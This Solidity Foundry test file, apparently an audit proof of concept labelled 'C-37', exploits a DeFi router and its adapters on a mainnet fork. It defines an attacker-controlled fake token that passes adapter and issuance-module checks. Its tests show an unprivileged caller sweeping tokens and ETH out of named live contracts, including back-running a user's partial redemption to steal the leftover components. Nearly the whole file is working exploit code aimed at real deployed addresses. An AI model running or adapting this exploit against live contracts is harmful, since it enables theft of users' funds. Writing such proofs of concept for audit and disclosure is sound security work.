// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IDeadDeFiRouter {
    function redeem(
        address adapter,
        address inputToken,
        uint256 amount,
        address[] calldata outputTokens,
        uint256[] calldata minAmountsOut
    ) external;
    function feeBps() external view returns (uint256);
    function owner() external view returns (address);
    function paused() external view returns (bool);
}

/// @notice Attacker-controlled token that satisfies every adapter/module call surface.
///         `transferFrom`/`transfer` are no-ops that return true; the fake SetToken
///         surface makes BasicIssuanceModule.redeem() pass its validity checks.
contract FakeProtocolToken {
    string public symbol = "FAKE";
    uint8 public decimals = 18;
    address public sweepToken;

    constructor(address _sweepToken) {
        sweepToken = _sweepToken;
    }

    // --- ERC20 surface ---
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address, uint256) external pure returns (bool) { return true; }
    function transferFrom(address, address, uint256) external pure returns (bool) { return true; }

    // --- direct-call adapter surfaces ---
    function redeem(uint256) external {}
    function redeem(address, uint256) external {}
    function exitPool(uint256) external {}
    function exitPool(uint256, uint256[] calldata) external {}
    function withdraw(uint256) external {}
    function underlying() external view returns (address) { return sweepToken; }

    // --- SetToken surface used by BasicIssuanceModule.redeem ---
    function isModule(address) external pure returns (bool) { return true; }
    function isInitializedModule(address) external pure returns (bool) { return true; }
    function burn(address, uint256) external {}
    function getComponents() external view returns (address[] memory c) {
        c = new address[](1);
        c[0] = sweepToken;
    }
    function hasExternalPosition(address) external pure returns (bool) { return false; }
    function getDefaultPositionRealUnit(address) external pure returns (int256) { return int256(1e18); }
    function strictInvokeTransfer(address, address, uint256) external {}
}

/// @title C-37 PoC — DeadDeFi v2 router/adapter arbitrary-output sweep primitive.
/// All tests are fork-only (no mainnet transactions).
contract C37Test is Test {
    address constant ROUTER = 0x121D5A2791791A62d0bE62C51459b1d3777701aF;
    address constant PIEDAO_ADAPTER = 0xE2e20d6f9a30642C8345f6040D1033e74aD2bb70;
    address constant INDEXCOOP_ADAPTER = 0x248e8bD1985388D2D62e79C6A50051DAeDa30BC9;
    address constant AAVE_ADAPTER = 0xF5CCeab563cDBc5e2Ce1dba77861250389581d2b;
    address constant DPI = 0x1494CA1F11D487c2bBe4543E90080AeBa4BA3C2b;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant COMP = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
    address constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address constant MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
    address constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address constant LDO = 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32;
    address constant RPL = 0xD33526068D116cE69F19A9ee46F0bd304F21A51f;
    address constant PENDLE = 0x808507121B80c02388fAd14726482e061B8da827;
    address constant ENA = 0x57e114B691Db790C35207b2e685D4A43181e6061;
    address constant DPI_WHALE = 0x4d5ef58aAc27d99935E5b6B4A6778ff292059991;

    IDeadDeFiRouter router = IDeadDeFiRouter(ROUTER);

    function setUp() public {
        vm.createSelectFork(vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com"))));
        // live-state sanity
        require(router.feeBps() == 0, "feeBps changed");
        require(!router.paused(), "router paused");
        require(router.owner() == 0xD9319dD23c3d0E37949CCFFB98764A1B4B095C38, "owner changed");
        require(router.owner().code.length == 0, "owner no longer an EOA");
    }

    /// Live adapters/router hold nothing today: the sweep primitive is armed but unfunded.
    function test_live_state_adapters_and_router_empty() public view {
        address[13] memory ads = [
            0x248e8bD1985388D2D62e79C6A50051DAeDa30BC9, 0xF5CCeab563cDBc5e2Ce1dba77861250389581d2b,
            0xdF903FF062DD851d57f4E18E5444e7ef23D4DA7F, 0xb28153Be87A0B8Fb948f83ea58800977E7c8bC13,
            0xEC49C17fE2D7dd0724Ac9299D1a61Be30D1F3e6F, 0xE2e20d6f9a30642C8345f6040D1033e74aD2bb70,
            0x7989Fc1ccFDff1E2899299CC26c7Fc7ad07D55dB, 0xD193048B5Cd99A470D990080E3bebb563C89bbEb,
            0xa6cdf6EC1D546302B2Ca1B3165347863E53DC13a, 0x3D1165510c078aDF7bdd723f2CFDf503CaA85937,
            0x1250AC3781b80339C5cDf2646074a689c99A173d, 0xec5588fD434848aA6ef4900B8441e2aC1ceEf676,
            0x3e108C4E08Bf11b9A2399C127728654B5EB42c7D
        ];
        address[4] memory toks = [DPI, COMP, WETH, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48];
        for (uint256 i = 0; i < ads.length; i++) {
            assertEq(ads[i].balance, 0, "adapter ETH nonzero");
            for (uint256 j = 0; j < toks.length; j++) {
                assertEq(IERC20(toks[j]).balanceOf(ads[i]), 0, "adapter token nonzero");
            }
        }
        assertEq(ROUTER.balance, 0, "router ETH nonzero");
    }

    /// A: direct-call adapter (PieDAO) — fake input token + arbitrary output list sweeps any
    ///    token that sits in the adapter.  Zero capital, zero real protocol tokens.
    function test_A_piedaoAdapter_fakeToken_sweeps_adapter_balance() public {
        FakeProtocolToken fake = new FakeProtocolToken(DPI);
        // Simulate value landing in the adapter (user error / incomplete prior sweep).
        vm.prank(DPI_WHALE);
        IERC20(DPI).transfer(PIEDAO_ADAPTER, 1 ether);
        assertEq(IERC20(DPI).balanceOf(PIEDAO_ADAPTER), 1 ether);

        address attacker = makeAddr("attacker");
        address[] memory outs = new address[](1);
        outs[0] = DPI;
        uint256[] memory mins = new uint256[](1);
        mins[0] = 0;
        vm.prank(attacker);
        router.redeem(PIEDAO_ADAPTER, address(fake), 0, outs, mins);

        assertEq(IERC20(DPI).balanceOf(attacker), 1 ether, "attacker did not receive swept DPI");
        assertEq(IERC20(DPI).balanceOf(PIEDAO_ADAPTER), 0, "adapter still holds DPI");
    }

    /// B: module adapter (Index Coop) — the caller only needs 1 wei of the real Set token
    ///    (open-market dust); the sweep still takes the adapter's entire DPI balance.
    function test_B_indexCoopAdapter_dustInput_sweeps_adapter_balance() public {
        vm.prank(DPI_WHALE);
        IERC20(DPI).transfer(INDEXCOOP_ADAPTER, 2 ether);
        assertEq(IERC20(DPI).balanceOf(INDEXCOOP_ADAPTER), 2 ether);

        address attacker = makeAddr("attacker2");
        vm.prank(DPI_WHALE);
        IERC20(DPI).transfer(attacker, 1);
        vm.startPrank(attacker);
        IERC20(DPI).approve(ROUTER, 1);
        address[] memory outs = new address[](1);
        outs[0] = DPI;
        uint256[] memory mins = new uint256[](1);
        mins[0] = 0;
        router.redeem(INDEXCOOP_ADAPTER, DPI, 1, outs, mins);
        vm.stopPrank();

        assertApproxEqAbs(IERC20(DPI).balanceOf(attacker), 2 ether, 2, "attacker did not receive swept DPI");
        assertEq(IERC20(DPI).balanceOf(INDEXCOOP_ADAPTER), 0, "adapter still holds DPI");
    }

    /// C: any ETH sitting in the router is forwarded to the caller of any redeem() call
    ///    (`_forwardETH`), even a zero-amount one.
    function test_C_router_eth_donation_is_grabbed_by_any_redeem() public {
        vm.deal(ROUTER, 1 ether);
        FakeProtocolToken fake = new FakeProtocolToken(WETH);
        address attacker = makeAddr("attacker3");
        address[] memory outs = new address[](1);
        outs[0] = WETH;
        uint256[] memory mins = new uint256[](1);
        mins[0] = 0;
        vm.prank(attacker);
        router.redeem(PIEDAO_ADAPTER, address(fake), 0, outs, mins);

        assertEq(attacker.balance, 1 ether, "attacker did not receive router ETH");
        assertEq(ROUTER.balance, 0, "router still holds ETH");
    }

    /// D: ETH sitting in the Aave V1 adapter is wrapped to WETH and swept by the same primitive.
    function test_D_aaveAdapter_eth_is_wrapped_and_swept() public {
        vm.deal(AAVE_ADAPTER, 1 ether);
        FakeProtocolToken fake = new FakeProtocolToken(WETH);
        address attacker = makeAddr("attacker4");
        address[] memory outs = new address[](1);
        outs[0] = WETH;
        uint256[] memory mins = new uint256[](1);
        mins[0] = 0;
        vm.prank(attacker);
        router.redeem(AAVE_ADAPTER, address(fake), 0, outs, mins);

        assertEq(IERC20(WETH).balanceOf(attacker), 1 ether, "attacker did not receive WETH");
        assertEq(AAVE_ADAPTER.balance, 0, "adapter still holds ETH");
    }

    /// E: the flow-theft case.  A user redemption whose outputTokens list is incomplete leaves
    ///    value in the adapter; an unprivileged attacker back-runs it with 1 wei of the input
    ///    token and sweeps every leftover component.
    function test_E_partial_redemption_leftovers_are_stolen_by_backrun() public {
        address whale = DPI_WHALE;
        uint256 amount = 10 ether; // 10 DPI
        vm.startPrank(whale);
        IERC20(DPI).approve(ROUTER, amount);
        address[] memory partialOuts = new address[](1);
        partialOuts[0] = COMP; // user/front-end lists only ONE of 8 components
        uint256[] memory pmins = new uint256[](1);
        pmins[0] = 0;
        router.redeem(INDEXCOOP_ADAPTER, DPI, amount, partialOuts, pmins);
        vm.stopPrank();

        uint256 uniLeft = IERC20(UNI).balanceOf(INDEXCOOP_ADAPTER);
        uint256 mkrLeft = IERC20(MKR).balanceOf(INDEXCOOP_ADAPTER);
        assertGt(uniLeft, 0, "no UNI left in adapter");
        assertGt(mkrLeft, 0, "no MKR left in adapter");

        // Attacker acquires 1 wei DPI (open market) and back-runs the sweep.
        address attacker = makeAddr("attacker5");
        vm.prank(whale);
        IERC20(DPI).transfer(attacker, 1);
        vm.startPrank(attacker);
        IERC20(DPI).approve(ROUTER, 1);
        address[] memory full = new address[](7);
        full[0] = MKR; full[1] = UNI; full[2] = AAVE; full[3] = LDO;
        full[4] = RPL; full[5] = PENDLE; full[6] = ENA;
        uint256[] memory mins = new uint256[](7);
        router.redeem(INDEXCOOP_ADAPTER, DPI, 1, full, mins);
        vm.stopPrank();

        assertApproxEqAbs(IERC20(UNI).balanceOf(attacker), uniLeft, 10, "attacker did not capture UNI leftovers");
        assertApproxEqAbs(IERC20(MKR).balanceOf(attacker), mkrLeft, 10, "attacker did not capture MKR leftovers");
        assertEq(IERC20(UNI).balanceOf(INDEXCOOP_ADAPTER), 0, "adapter still holds UNI");
    }

    /// F: negative control — a complete output list leaves nothing behind; sweep yields 0.
    function test_F_complete_redemption_leaves_nothing() public {
        address whale = DPI_WHALE;
        vm.startPrank(whale);
        IERC20(DPI).approve(ROUTER, 1 ether);
        address[] memory all8 = new address[](8);
        all8[0] = COMP; all8[1] = MKR; all8[2] = UNI; all8[3] = AAVE;
        all8[4] = LDO; all8[5] = RPL; all8[6] = PENDLE; all8[7] = ENA;
        uint256[] memory mins = new uint256[](8);
        router.redeem(INDEXCOOP_ADAPTER, DPI, 1 ether, all8, mins);
        vm.stopPrank();

        for (uint256 i = 0; i < all8.length; i++) {
            assertEq(IERC20(all8[i]).balanceOf(INDEXCOOP_ADAPTER), 0, "adapter retained component");
        }
    }
}
